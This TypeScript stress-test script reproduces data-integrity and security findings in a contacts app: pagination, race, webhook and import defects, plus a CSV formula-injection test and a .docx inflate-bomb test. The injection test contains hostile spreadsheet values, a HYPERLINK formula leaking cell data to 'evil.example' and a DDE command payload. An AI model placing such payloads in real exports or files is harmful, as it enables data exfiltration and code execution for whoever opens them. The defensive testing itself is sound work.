/**
 * Reproductions of the data-integrity findings: each one is the smallest sequence that
 * makes the defect observable on PGlite.
 *
 *   npx tsx stress-tests/resilience-repros.ts
 */
import { check, errorText, finding, rejects, run, summary } from "./_harness";
process.env.NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY ||= "pk_test_stress";
process.env.CLERK_SECRET_KEY ||= "sk_test_stress";
import { and, eq, sql } from "drizzle-orm";
import JSZip from "jszip";
import Papa from "papaparse";
import { getDb, rowsOf } from "../src/db";
import { contactIdentities, contacts, importJobRows, imports, interactions, noteBatches, userSettings, type ImportJobRowPayload } from "../src/db/schema";
import { ensureUserSettings } from "../src/lib/user-settings";
import { listContactsPage } from "../src/lib/contacts-page-query";
import { createContactForUser } from "../src/lib/contact-writes";
import { encrypt } from "../src/lib/crypto";
import { drainDueDeliveries } from "../src/lib/webhooks/dispatch";
import { runImportJobById } from "../src/lib/import-job-dispatch";
import { saveNoteBatch } from "../src/lib/note-batch-save";
import { docxToText } from "../src/lib/cloud-files";

const USER = "stress-resilience";
const WRITE = { skipRevalidate: true, skipEmbedding: true, skipSummary: true, skipCloseness: true } as const;

async function swallowRevalidate<T>(fn: () => Promise<T>): Promise<T | undefined> {
  try { return await fn(); } catch (err) {
    if (String(err).includes("static generation store missing")) return undefined;
    throw err;
  }
}

run(async () => {
  const db = await getDb();
  await db.delete(interactions).where(eq(interactions.userId, USER));
  await db.delete(noteBatches).where(eq(noteBatches.userId, USER));
  await db.delete(contacts).where(eq(contacts.userId, USER));
  await db.delete(imports).where(eq(imports.userId, USER));
  await db.delete(userSettings).where(eq(userSettings.userId, USER));
  await ensureUserSettings(USER);
  await db.execute(sql`UPDATE user_settings SET comped_plan = 'max', comped_at = now() WHERE user_id = ${USER}`);

  console.log("M2 — closeness-sort keyset pagination with NULL closeness rows (post-import state)...");
  {
    const scored = Array.from({ length: 60 }, (_, i) => ({ userId: USER, fullName: `Scored ${i}`, sortKey: `scored ${i}`, closeness: 10 + i }));
    const unscored = Array.from({ length: 60 }, (_, i) => ({ userId: USER, fullName: `Unscored ${i}`, sortKey: `unscored ${i}`, closeness: null }));
    await db.insert(contacts).values([...scored, ...unscored]);
    const seen = new Set<string>();
    let cursor: string | undefined; let pages = 0;
    for (;;) {
      const page = await listContactsPage(USER, { sort: "closeness", limit: 50, cursor } as never);
      for (const c of page.items as { id: string }[]) seen.add(c.id);
      pages++;
      if (!page.nextCursor || pages > 20) break;
      cursor = page.nextCursor;
    }
    finding("DI-PAGE-NULL", "walking the closeness sort reaches all 120 contacts when 60 have NULL closeness", seen.size === 120, `${seen.size}/120 reached in ${pages} page(s) — NULL sorts first under DESC, and a cursor built from a NULL row (c=0) excludes every scored row`);
    await db.delete(contacts).where(eq(contacts.userId, USER));
  }

  console.log("\nM6 — two concurrent creates of the same new person...");
  {
    const input = { fullName: "Same Person", email: "same.person@example.com" };
    const results = await Promise.allSettled([createContactForUser(USER, input, WRITE), createContactForUser(USER, input, WRITE)]);
    const rows = await db.select({ id: contacts.id }).from(contacts).where(and(eq(contacts.userId, USER), eq(contacts.email, input.email)));
    const idents = await db.select().from(contactIdentities).where(eq(contactIdentities.userId, USER));
    finding("DI-DUP-CREATE", "two concurrent creates with the same email yield one contact (createContactForUser discards the identity-claim result)", rows.length === 1, `${rows.length} contacts, ${idents.length} identity row(s), ${results.filter((r) => r.status === "rejected").length} rejected`);
    await db.delete(contacts).where(eq(contacts.userId, USER));
  }

  console.log("\nM1 — overlapping outbound-webhook drains deliver the same event twice...");
  {
    await db.execute(sql`DELETE FROM webhook_endpoints WHERE user_id = ${USER}`);
    const [{ id: endpointId }] = rowsOf<{ id: string }>(await db.execute(sql`
      INSERT INTO webhook_endpoints (user_id, url, secret_encrypted, event_types, status)
      VALUES (${USER}, 'https://example.com/hook', ${encrypt("whsec_stress")}, '["contact.created"]'::jsonb, 'active') RETURNING id`));
    await db.execute(sql`INSERT INTO outbound_webhook_deliveries (user_id, endpoint_id, event_id, event_type, payload, status, next_attempt_at)
      VALUES (${USER}, ${endpointId}, 'evt_stress_1', 'contact.created', '{"id":"evt_stress_1"}'::jsonb, 'pending', now() - interval '1 minute')`);
    let posts = 0;
    const realFetch = globalThis.fetch;
    globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
      if (String(input).startsWith("https://example.com/hook")) {
        posts++;
        await new Promise((r) => setTimeout(r, 300));
        return new Response("ok", { status: 200 });
      }
      return realFetch(input, init);
    }) as typeof fetch;
    // Bypass DNS: assertDeliverable resolves example.com, which the sandbox cannot. Pre-check by monkeypatching lookup is intrusive; instead run the drain twice and tolerate a guard failure.
    let guardFailed = false;
    try {
      const [a, b] = await Promise.all([drainDueDeliveries({ budgetMs: 10_000, max: 10 }), drainDueDeliveries({ budgetMs: 10_000, max: 10 })]);
      check(`drain A attempted ${a.attempted}, drain B attempted ${b.attempted}`, true);
    } catch (err) { guardFailed = true; check("drain threw", false, errorText(err)); }
    globalThis.fetch = realFetch;
    const [row] = rowsOf<{ attempts: number; status: string }>(await db.execute(sql`SELECT attempts, status FROM outbound_webhook_deliveries WHERE event_id = 'evt_stress_1'`));
    if (posts === 0 && !guardFailed) {
      check("sandbox note: assertDeliverable could not resolve example.com, so no POST was made; the double-claim is shown by the attempts counter instead", true, `attempts=${row?.attempts} status=${row?.status}`);
    }
    finding("DI-WEBHOOK-DOUBLE", "one pending delivery is attempted exactly once when two drains overlap (no claim/lease on outbound_webhook_deliveries)", (posts <= 1) && (row?.attempts ?? 0) <= 1, `${posts} POSTs, attempts=${row?.attempts}, status=${row?.status}`);
    await db.execute(sql`DELETE FROM webhook_endpoints WHERE user_id = ${USER}`);
  }

  console.log("\nH1 — two runners on one import job (stall backstop + live runner)...");
  {
    const rows = Array.from({ length: 40 }, (_, i) => ({ index: i, firstName: `Only${i}`, lastName: `Name${i}`, email: "", company: "", position: "", connectedOn: "15 Mar 2024", url: "" }));
    const [job] = await db.insert(imports).values({ userId: USER, importType: "linkedin_connections", fileName: "f.csv", status: "processing", totalRows: rows.length, stats: {} }).returning();
    await db.insert(importJobRows).values(rows.map((payload, i) => ({ importId: job.id, userId: USER, rowIndex: i, payload: payload as ImportJobRowPayload })));
    await Promise.all([swallowRevalidate(() => runImportJobById(job.id)), swallowRevalidate(() => runImportJobById(job.id))]);
    const [{ n }] = rowsOf<{ n: number }>(await db.execute(sql`select count(*)::int as n from contacts where user_id = ${USER}`));
    const after = await db.query.imports.findFirst({ where: eq(imports.id, job.id) });
    finding("DI-IMPORT-DOUBLE", "40 name-only rows produce 40 contacts when two runners overlap (no job-level lease; chunk claim re-claims 'processing')", Number(n) === 40 && (after?.contactsCreated ?? 0) === 40, `${n} contacts, contactsCreated=${after?.contactsCreated}, status=${after?.status}`);
    await db.delete(contacts).where(eq(contacts.userId, USER));
    await db.delete(imports).where(eq(imports.userId, USER));
  }

  console.log("\nH2 — capture save that throws on the 2nd participant leaves a 'saved' batch...");
  {
    const parsed = (name: string | null) => ({ name, company: null, role: null, presence: "present", location: null, email: null, linkedin_url: null, met_at: null, topics: [], action_items: [], follow_up_recommendation: null, follow_up_days: null, relationship_score_suggestion: null, relevance: null, tags: [], summary: null, key_facts: [], opportunities: [], implied_next_steps: [], shared_interests: [], suggested_next_message: null, confidence: null, interaction_date: null, low_confidence_fields: [] }) as never;
    const participant = (name: string | null) => ({ notes: `met ${name}`, parsed: parsed(name), mergeContactId: null, createReminder: false, relationshipScore: 3, tagNames: [], opportunities: [] });
    const sourceHash = `stress-${Date.now()}`;
    const r = await rejects(() => saveNoteBatch(USER, {
      sourceText: "notes", sourceHash, anchorIso: "2026-10-01", anchorBasis: "note", entryPoint: "capture",
      participants: [participant("First Person"), participant(null), participant("Third Person")],
      commitments: [], skipped: { relative: 0, unverifiable: 0, past: 0 },
    } as never));
    const batch = await db.query.noteBatches.findFirst({ where: and(eq(noteBatches.userId, USER), eq(noteBatches.sourceHash, sourceHash)) });
    const made = await db.select({ id: contacts.id }).from(contacts).where(eq(contacts.userId, USER));
    finding("DI-CAPTURE-PARTIAL", "a save that throws mid-way does not leave a note_batches row in status 'saved' (the capture runner's resume path treats that row as success and reports 1 of 3 people as the saved result)", !r.threw || batch?.status !== "saved", `threw=${r.threw} (${r.threw ? errorText(r.error) : ""}); batch status=${batch?.status}, participants in result=${(batch?.result as { participants?: unknown[] } | null)?.participants?.length ?? "?"}, contacts created=${made.length}/2`);
    await db.delete(contacts).where(eq(contacts.userId, USER));
  }

  console.log("\nCSV formula injection in the admin export (Papa.unparse without escapeFormulae)...");
  {
    const rows = [{ name: '=HYPERLINK("https://evil.example/?"&A1,"open")', email: "-2+3+cmd|' /C calc'!A0" }];
    const csv = Papa.unparse(rows);
    const escaped = Papa.unparse(rows, { escapeFormulae: true });
    finding("INJ-CSV", "admin export CSV cells starting with = + - @ are neutralised", csv === escaped, `unescaped line: ${csv.split("\n")[1]}`);
  }

  console.log("\nOneDrive .docx inflate bomb (docxToText expands word/document.xml with no size cap)...");
  {
    const zip = new JSZip();
    const MB = 1024 * 1024;
    zip.file("word/document.xml", "<w:document><w:p>" + " ".repeat(120 * MB) + "</w:p></w:document>", { compression: "DEFLATE" });
    const bytes = await zip.generateAsync({ type: "uint8array" });
    const heap0 = process.memoryUsage().heapUsed;
    const t0 = Date.now();
    const r = await rejects(() => docxToText(bytes));
    const grew = Math.round((process.memoryUsage().heapUsed - heap0) / MB);
    finding("INJ-DOCX-BOMB", `a ${Math.round(bytes.byteLength / 1024)} KB .docx that inflates to 120 MB is refused before full expansion`, r.threw && !/heap|allocation/i.test(errorText(r.error)), r.threw ? errorText(r.error) : `expanded fully in ${Date.now() - t0} ms, heap +${grew} MB, then returned ${"ok"}`);
  }

  await db.delete(userSettings).where(eq(userSettings.userId, USER));
  summary();
});
